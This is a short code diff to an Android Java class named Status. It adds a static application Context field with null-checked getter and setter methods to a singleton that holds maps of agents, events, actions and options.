@@ -10,10 +10,13 @@ package com.ht.RCSAndroidGUI;
 import java.util.ArrayList;
 import java.util.HashMap;
 
+import android.content.Context;
+
 import com.ht.RCSAndroidGUI.action.Action;
 import com.ht.RCSAndroidGUI.agent.Agent;
 import com.ht.RCSAndroidGUI.conf.Option;
 import com.ht.RCSAndroidGUI.event.Event;
+import com.ht.RCSAndroidGUI.utils.Check;
 
 // TODO: Auto-generated Javadoc
 // Singleton Class
@@ -42,6 +45,10 @@ public class Status {
 
 	/** The drift. */
 	public int drift;
+	
+	/** The context. */
+	private static Context context;
+
 
 	/**
 	 * Instantiates a new status.
@@ -81,6 +88,21 @@ public class Status {
 		eventsMap.clear();
 		actionsMap.clear();
 		optionsMap.clear();
+	}
+	
+	/**
+	 * Gets the app context.
+	 *
+	 * @return the app context
+	 */
+	public static Context getAppContext() {
+		Check.requires(context != null, "Null Context");
+		return context;
+	}
+	
+	public static void setAppContext(Context context) {
+		Check.requires(context != null, "Null Context");
+		Status.context=context;
 	}
 
 	// Add an agent to the map
